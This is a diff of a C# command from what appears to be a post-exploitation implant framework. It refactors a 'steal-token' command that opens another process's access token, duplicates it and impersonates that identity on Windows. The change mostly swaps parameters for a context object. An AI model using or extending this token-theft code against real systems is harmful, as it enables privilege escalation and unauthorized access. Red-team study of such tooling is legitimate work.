@@ -17,11 +17,11 @@ namespace Commands
     public class StealTokenCommand : AgentCommand
     {
         public override string Name => "steal-token";
-        public override void InnerExecute(AgentTask task, Agent.Models.Agent agent, AgentTaskResult result, MessageManager commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
             if (!int.TryParse(task.SplittedArgs[0], out var pid))
             {
-                result.Result += $"Faile to parse ProcessId";
+                context.Result.Result += $"Faile to parse ProcessId";
                 return;
             }
 
@@ -35,7 +35,7 @@ namespace Commands
                 //open handle to token
                 if (!Agent.Native.Advapi.OpenProcessToken(process.Handle, Agent.Native.Advapi.DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
                 {
-                    result.Result += $"Failed to open process token";
+                    context.Result.Result += $"Failed to open process token";
                     return;
                 }
 
@@ -45,7 +45,7 @@ namespace Commands
                 {
                     Agent.Native.Kernel32.CloseHandle(hToken);
                     process.Dispose();
-                    result.Result += $"Failed to duplicate token";
+                    context.Result.Result += $"Failed to duplicate token";
                     return;
                 }
 
@@ -56,12 +56,12 @@ namespace Commands
                     Agent.Native.Kernel32.CloseHandle(hToken);
                     process.Dispose();
 
-                    result.Result += $"Successfully impersonate token {identity.Name}";
+                    context.Result.Result += $"Successfully impersonate token {identity.Name}";
                     return;
                 }
 
 
-                result.Result += $"Failed to impersonate token";
+                context.Result.Result += $"Failed to impersonate token";
                 return;
             }
             catch
